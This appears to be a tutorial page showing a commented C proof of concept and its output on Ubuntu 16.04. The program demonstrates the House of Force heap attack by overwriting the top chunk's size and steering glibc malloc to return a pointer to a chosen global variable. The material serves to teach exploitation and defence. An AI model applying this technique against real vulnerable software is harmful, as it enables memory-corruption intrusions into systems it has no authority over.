# House of Force Explanation

This is a well documented C source file that explains how a House of Force attack works.

Here is the code:
```
#include <stdio.h>
#include <stdlib.h>

unsigned long target;

int main(void)
{
	puts("So let's cover House of Force.");
	puts("With this Hose Attack, our goal is to get malloc to allocate a chunk outside of the heap.");
	puts("To do this, we will attack the wilderness value, which specifies how much space is left in the wilderness.");
	puts("The wilderness is space that has been mapped to the heap, yet has not been allocated yet.");
	puts("We will overwrite this value with a larger value, so we can get malloc to allocate space outside of the heap.");
	puts("Let's get started.\n");

	puts("Our goal will be to get malloc to return a pointer to the bss variable.");
	printf("Variable Address:\t%p\n\n", &target);


	puts("So let's start off by allocating a chunk. We will use this to set up the heap, and as a reference to overwrite the wilderness value.\n");
	unsigned long *ptr = malloc(0x10);

	puts("Now using some sort of bug, we can overwrite the wilderness value to a much larger value.");

	printf("Old Wilderness: 0x%lx\n", ptr[3]);

	ptr[3] = 0xffffffffffffffff;
	
	printf("New Wilderness: 0x%lx\n\n", ptr[3]);


	puts("Now that we have increased the wilderness value significantly, let's allocate some chunks.");
	puts("The first chunk will be massive, and will align the heap right up to the target address.");
	puts("Then when we allocate the second chunk, it will overlap directly with the target chunk.\n");


	puts("Now for how much space to allocate is pretty similar.");
	puts("It will be (targetAddress - wilderness - 0x20).");
	puts("Where targetAddress is the address we are trying to get malloc to allocate.");
	puts("The wilderness value is the address of the start of the value, which is the previous qword from the wilderness value.");
	puts("The 0x20 is four 4 qwords, because each of the two chunks takes 2 qwords (0x10 bytes) of space for the heap metadata.\n");

	unsigned long *wilderness = &ptr[2];
	unsigned long offset = (unsigned long)&target - (unsigned long)wilderness - sizeof(long)*4;


	printf("Target Address:\t\t%p\n", &target);
	printf("Wilderness Address:\t%p\n", wilderness);
	printf("Malloc Size:\t\t%lx\n\n", offset);
	printf("Now to allocate the first chunk.\n\n");

	unsigned long *chunk0, *chunk1;

	chunk0 = malloc(offset);

	printf("We can see that we allocated a chunk at:\t%p\n", chunk0);
	printf("With that the heap should be aligned so the next malloc gives us our target address.\n\n");
	chunk1 = malloc(0x10);

	printf("Chunk allocated at:\t%p\n\n", chunk1);

	puts("With that, we got our target chunk!");
}
```

Here is the code running (ran on `Ubuntu 16.04`):
```
./house_force_exp 
So let's cover House of Force.
With this Hose Attack, our goal is to get malloc to allocate a chunk outside of the heap.
To do this, we will attack the wilderness value, which specifies how much space is left in the wilderness.
The wilderness is space that has been mapped to the heap, yet has not been allocated yet.
We will overwrite this value with a larger value, so we can get malloc to allocate space outside of the heap.
Let's get started.

Our goal will be to get malloc to return a pointer to the bss variable.
Variable Address:	0x602050

So let's start off by allocating a chunk. We will use this to set up the heap, and as a reference to overwrite the wilderness value.

Now using some sort of bug, we can overwrite the wilderness value to a much larger value.
Old Wilderness: 0x20bd1
New Wilderness: 0xffffffffffffffff

Now that we have increased the wilderness value significantly, let's allocate some chunks.
The first chunk will be massive, and will align the heap right up to the target address.
Then when we allocate the second chunk, it will overlap directly with the target chunk.

Now for how much space to allocate is pretty similar.
It will be (targetAddress - wilderness - 0x20).
Where targetAddress is the address we are trying to get malloc to allocate.
The wilderness value is the address of the start of the value, which is the previous qword from the wilderness value.
The 0x20 is four 4 qwords, because each of the two chunks takes 2 qwords (0x10 bytes) of space for the heap metadata.

Target Address:		0x602050
Wilderness Address:	0x1618430
Malloc Size:		fffffffffefe9c00

Now to allocate the first chunk.

We can see that we allocated a chunk at:	0x1618440
With that the heap should be aligned so the next malloc gives us our target address.

Chunk allocated at:	0x602050

With that, we got our target chunk!
```